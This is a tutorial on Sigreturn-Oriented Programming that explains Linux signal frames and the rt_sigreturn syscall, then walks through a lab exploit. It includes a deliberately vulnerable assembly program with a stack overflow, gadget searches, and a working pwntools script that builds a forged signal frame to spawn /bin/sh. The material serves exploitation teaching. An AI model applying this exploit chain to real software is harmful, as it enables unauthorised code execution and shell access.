# SROP - Sigreturn Oriented Programming

## Theory

SROP (Sigreturn-Oriented Programming) is an exploitation technique using gadgets like ROP but this technique requires only 2 gadgets: `pop rax ; ret` or `mov rax, 0xf` and `syscall`. (or a way to **setup rax to 15**) In general, we use SROP when we have a syscall gadget and when there are not enough interesting gadgets for ROP: `pop rdi ; ret`, `pop rsi ; ret`, `pop rdx ; ret`...

### Why 0xf in RAX ?

0xf (15 in decimal) is the **syscall ID rt\_sigreturn** :

```python
❯ grep "rt_sigreturn" /usr/include/x86_64-linux-gnu/asm/unistd_64.h
#define __NR_rt_sigreturn 15
```

This syscall allows to restore the entire register context from memory pointed at by ESP.

### Signals on UNIX systems

A signal is a form of **IPC** (Inter-process communication) used by Unix systems and respecting POSIX standards. They are used to kill processes, to tell them that timers have expired or to warn them of exceptional behavior...

Signals are defined in the `<signal.h>` library.

We can find the list of signals in the man page miscellaneous by typing the command line: `man 7 signal`.

In low level, the signals are managed in this way :

![](https://i.imgur.com/peKsKGB.png)

* (1): When a signal occurs the process will be temporarily suspended and will enter Kernel Land
* (2) : The kernel saves the registers in the corresponding stack frame for the process and jumps to the previously saved signal handler (in User Land) to process the corresponding signal
* (3) : The kernel restores the stack frame previously registered for the process thanks to `sigreturn()`
* (4) : The process returns to User Land

The structure of the signal frame when a signal has occurred is as follows (2: ucontext save) :

![](https://i.imgur.com/3Ba5fSj.png)

The signal frame is 248 bytes long, ignoring the first 8 bytes of `rt_sigreturn()` which points to the syscall address `sys_rt_sigreturn`. The sigreturn system call returns the signal handler and cleans up the stack frame.

### 2 Defects in signal management

* The signal frame is **editable** because we are in User Land.
* The kernel does **not compare** the **saved frame signal** and the **restored frame signal**.

## Practice

A simple assembler program for an exploitation example :

```python
; nasm -f elf64 vuln.asm -o vuln.o && ld vuln.o -o vuln
global _start

section .data
shell db '/bin/sh', 0

section .text
_vuln:
	push rbp
	mov rbp, rsp
	sub rsp, 0x40
	mov rax, 0
	mov rdi, 0
	lea rsi, [rbp-0x40]
	mov rdx, 0x400
	syscall
	leave
	push 0
	pop rax
	ret

_start:
	push rbp
	mov rbp, rsp
	call _vuln
	mov rax, 60
	mov rdi, 0
	syscall
```

For our exploitation we need :

* **A way to setup a value in RAX**, here the address of `pop rax ; ret` :

```python
❯ ropper
(ropper)> file vuln
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] File loaded.
(vuln/ELF/x86_64)> search pop rax
[INFO] Searching for gadgets: pop rax

[INFO] File: vuln
0x0000000000401020: pop rax; ret;
```

* A **syscall gadget** to execute `sys_rt_sigretun` (produce a signal) and `sys_execve` (open a shell when overwriting the signal frame) :

```python
(vuln/ELF/x86_64)> search syscall
[INFO] Searching for gadgets: syscall

[INFO] File: vuln
0x000000000040101b: syscall; 
```

* The address of the string `/bin/sh` in order to set it up in the RDI register to pass it as an argument to sys\_execv when overwriting the signal frame :

```python
(vuln/ELF/x86_64)> string /bin/sh


Strings
=======

Address     Value    
-------     -----    
0x00402000  /bin/sh
```

We can use [pwntools functions](https://docs.pwntools.com/en/stable/rop/srop.html) to overwrite store in the signal frame when executing a signal.

Here is our final exploitation script in python with the [pwntools](https://github.com/Gallopsled/pwntools) library, :

```python
#!/usr/bin/python2
from pwn import * 

p = process("./srop", stdin=PTY)
elf = ELF("./srop")
context.arch = "amd64"

padding = "A" * 72 # offset to overwrite RIP
pop_rax = 0x401020 # gadget to setup 15 in RAX
id_sys_rt_sigretun = 15 # https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
syscall = 0x40101b
bin_sh = 0x402000

def overwrite_signal_frame(bin_sh, syscall):
    frame = SigreturnFrame() # crafts a sigreturn frame
    frame.rax = constants.SYS_execve # 59 (id_syscall sys_execve) in RAX
    frame.rdi = bin_sh # /bin/sh addr in RDI
    frame.rip = syscall # syscall addr in RIP
    return(frame)

pld = padding 
pld += p64(pop_rax)
pld += p64(id_sys_rt_sigretun) 
pld += p64(syscall) 
pld += bytes(overwrite_signal_frame(bin_sh, syscall))

p.sendline(pld) # send payload
p.interactive() # spawn interactive shell
```

## References

* **FR**
* [https://nuts7.github.io/return-oriented-programming/#bonus\_srop](https://nuts7.github.io/return-oriented-programming/#bonus\_srop)
* **EN**
* [https://amriunix.com/post/sigreturn-oriented-programming-srop/](https://amriunix.com/post/sigreturn-oriented-programming-srop/)
* [https://angold4.com/2021/02/01/sigreturn-oriented-programming-attack/](https://angold4.com/2021/02/01/sigreturn-oriented-programming-attack/)
* [https://0x00sec.org/t/srop-signals-you-say/2890](https://0x00sec.org/t/srop-signals-you-say/2890)
* [https://hackmd.io/@imth/SROP](https://hackmd.io/@imth/SROP)
* [https://rog3rsm1th.github.io/posts/sigreturn-oriented-programming/#how-does-it-works](https://rog3rsm1th.github.io/posts/sigreturn-oriented-programming/#how-does-it-works)
* [https://mishrasunny174.tech/publication/pagedout-article-sigreturn-oriented-programming/](https://mishrasunny174.tech/publication/pagedout-article-sigreturn-oriented-programming/)
* [https://tripoloski1337.github.io/ctf/2020/01/26/SigReturn-Oriented-Programming.html](https://tripoloski1337.github.io/ctf/2020/01/26/SigReturn-Oriented-Programming.html)
* [https://thisissecurity.stormshield.com/2015/01/03/playing-with-signals-an-overview-on-sigreturn-oriented-programming/](https://thisissecurity.stormshield.com/2015/01/03/playing-with-signals-an-overview-on-sigreturn-oriented-programming/)
* [https://github.com/nushosilayer8/pwn/blob/master/srop/README.md](https://github.com/nushosilayer8/pwn/blob/master/srop/README.md)
* [https://www.cs.vu.nl/\~herbertb/papers/srop\_sp14.pdf](https://www.cs.vu.nl/\~herbertb/papers/srop\_sp14.pdf)
* [https://bananamafia.dev/post/srop/](https://bananamafia.dev/post/srop/)
